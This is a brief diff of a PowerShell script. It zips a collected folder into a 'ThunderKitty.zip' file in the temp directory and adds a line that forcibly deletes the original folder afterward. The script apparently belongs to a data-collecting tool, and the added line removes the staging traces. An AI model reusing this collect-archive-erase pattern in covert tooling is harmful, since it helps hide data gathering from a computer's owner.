@@ -128,3 +128,4 @@ foreach ($key in $scrp.Keys) {
 }
 cls
 Compress-Archive -Path $windkitty2save -DestinationPath "$env:TEMP\ThunderKitty.zip"  -Force
+Remove-Item -Path $windkitty2save -Force -Recurse
